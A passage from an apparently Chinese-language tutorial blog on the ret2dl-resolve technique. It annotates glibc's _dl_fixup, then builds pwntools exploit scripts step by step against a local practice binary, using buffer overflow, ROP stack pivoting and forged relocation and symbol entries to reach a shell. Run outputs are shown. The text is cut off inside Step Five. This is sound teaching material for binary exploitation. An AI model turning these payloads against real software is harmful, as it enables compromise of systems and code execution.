class="number">0x7fff</span>;</span><br><span class="line">      version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">      <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* We need to keep the scope around so do some locking. This is not necessary for objects which cannot be unloaded or when we are not using any threads (yet). */</span></span><br><span class="line">    <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">    <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">      flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">    <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">      THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* Currently result contains the base load address (or link map) of the object that defines sym.  Now add in the symbol offset.  */</span></span><br><span class="line"><span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load address) is also known.  */</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">    result = l;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"><span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Pwned-One-by-One"><a href="#Pwned-One-by-One" class="headerlink" title="Pwned One by One"></a>Pwned One by One</h1><ol><li>控制<code>eip</code>为<code>PLT[0]</code>的地址，只需传递一个<code>index_arg</code>参数</li><li>控制<code>index_arg</code>的大小，使<code>reloc</code>的位置落在可控地址（比如<code>.bss</code>段）内</li><li>伪造<code>reloc</code>的内容，使<code>sym</code>落在可控地址（比如<code>.bss</code>段）内</li><li>伪造<code>sym</code>的内容，使<code>name</code>落在可控地址（比如<code>.bss</code>段）内</li><li>伪造<code>name</code>为任意库函数，比如说<code>system</code></li></ol><p>接下来一步一步地实现对<code>dl-resolve</code>的利用</p><h2 id="Step-one"><a href="#Step-one" class="headerlink" title="Step one"></a>Step one</h2><p>先实现一个 ROP 直接返回<code>write@plt</code>，然后输出我们设定的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line"><span class="string">'A'</span> * offset,</span><br><span class="line">read_plt,</span><br><span class="line">pop_pop_pop_ret,</span><br><span class="line"><span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">pop_ebp_ret,</span><br><span class="line">buf - <span class="number">4</span>,</span><br><span class="line">leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">payload = flat([</span><br><span class="line">write_plt,</span><br><span class="line"><span class="number">0xdeadbeef</span>,</span><br><span class="line"><span class="number">1</span>, buf + <span class="number">80</span>, len(cmd)</span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最后会输出<code>buf + 80</code>上的字符串<code>/bin/sh</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 7067</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">/bin/sh[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h2 id="Step-Two"><a href="#Step-Two" class="headerlink" title="Step Two"></a>Step Two</h2><p>第二次直接返回<code>PLT[0]</code>，要带上<code>write</code>的<code>index_offset</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line"><span class="string">'A'</span> * offset,</span><br><span class="line">read_plt,</span><br><span class="line">pop_pop_pop_ret,</span><br><span class="line"><span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">pop_ebp_ret,</span><br><span class="line">buf - <span class="number">4</span>,</span><br><span class="line">leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt ./bof</span></span><br><span class="line">index_offset = <span class="number">0x20</span></span><br><span class="line">payload = flat([</span><br><span class="line">plt_0,</span><br><span class="line">index_offset,</span><br><span class="line"><span class="number">0xdeadbeef</span>,</span><br><span class="line"><span class="number">1</span>, buf + <span class="number">80</span>, len(cmd)</span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最后同样也是输出<code>/bin/sh</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 7270</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">/bin/sh[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h2 id="Step-Three"><a href="#Step-Three" class="headerlink" title="Step Three"></a>Step Three</h2><p>接下来我们在<code>.bss</code>上构造假的<code>reloc</code>，并让<code>dl-runtime.c</code>来解析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line"><span class="string">'A'</span> * offset,</span><br><span class="line">read_plt,</span><br><span class="line">pop_pop_pop_ret,</span><br><span class="line"><span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">pop_ebp_ret,</span><br><span class="line">buf - <span class="number">4</span>,</span><br><span class="line">leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt ./bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span> <span class="comment"># objdump -s -j .rel.plt ./bof</span></span><br><span class="line">index_offset = (buf + <span class="number">24</span>)- rel_plt</span><br><span class="line">r_info = <span class="number">0x607</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">payload = flat([</span><br><span class="line">plt_0,</span><br><span class="line">index_offset,</span><br><span class="line"><span class="number">0xdeadbeef</span>,</span><br><span class="line"><span class="number">1</span>, buf + <span class="number">80</span>, len(cmd),</span><br><span class="line">fake_reloc</span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最后得到相同的结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 8237</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">/bin/sh[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h2 id="Step-Four"><a href="#Step-Four" class="headerlink" title="Step Four"></a>Step Four</h2><p>这一次构造假的<code>.sym</code>，使其指向我们控制的<code>st_name</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line"><span class="string">'A'</span> * offset,</span><br><span class="line">read_plt,</span><br><span class="line">pop_pop_pop_ret,</span><br><span class="line"><span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">pop_ebp_ret,</span><br><span class="line">buf - <span class="number">4</span>,</span><br><span class="line">leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt ./bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span> <span class="comment"># objdump -s -j .rel.plt ./bof</span></span><br><span class="line">index_offset = (buf + <span class="number">24</span>)- rel_plt</span><br><span class="line">dynsym = <span class="number">0x080481d8</span> <span class="comment"># readelf -S ./bof | grep ".dynsym"</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span> <span class="comment"># readelf -S ./bof | grep ".dynstr"</span></span><br><span class="line">fake_sym_addr = buf + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = flat([</span><br><span class="line">st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span></span><br><span class="line">])</span><br><span class="line">payload = flat([</span><br><span class="line">plt_0,</span><br><span class="line">index_offset,</span><br><span class="line"><span class="number">0xdeadbeef</span>,</span><br><span class="line"><span class="number">1</span>, buf + <span class="number">80</span>, len(cmd),</span><br><span class="line">fake_reloc,</span><br><span class="line"><span class="string">'A'</span> * align,</span><br><span class="line">fake_sym</span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>因为<code>dynsym</code>里的<code>Elf32_Sym</code>结构体都是<code>0x10</code>字节大小，所以这里需要对齐操作；因为<code>Elf32_Sym</code>结构体的大小为<code>0x10</code>，所以要除以<code>0x10</code>才能得到<code>write</code>的<code>dynsym</code>索引号。最后成功运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 9736</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">/bin/sh[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h2 id="Step-Five"><a href="#Step-Five" class="headerlink" title="Step Five"></a>Step Five</h2><p>接下来一步把<code>st_name</code>指向输入的字符串<code>&quot;write&quot;</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line"><span class="string">'A'</span> * offset,</span><br><span class="line">read_plt,</span><br><span class="line">pop_pop_pop_ret,</span><br><span class="line"><span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">pop_ebp_ret,</span><br><span class="line">buf - <span class="number">4</span>,</span><br><span class="line">leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt ./bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span> <span class="comment"># objdump -s -j .rel.plt ./bof</span></span><br><span class="line">index_offset = (buf + <span class="number">24</span>)- rel_plt</span><br><span class="line">dynsym = <span class="number">0x080481d8</span> <span class="comment"># readelf -S ./bof | grep ".dynsym"</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span> <span class="comment"># readelf -S ./bof | grep ".dynstr"</span></span><br><span class="line">fake_sym_addr = buf + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sym = flat([</span><br><span 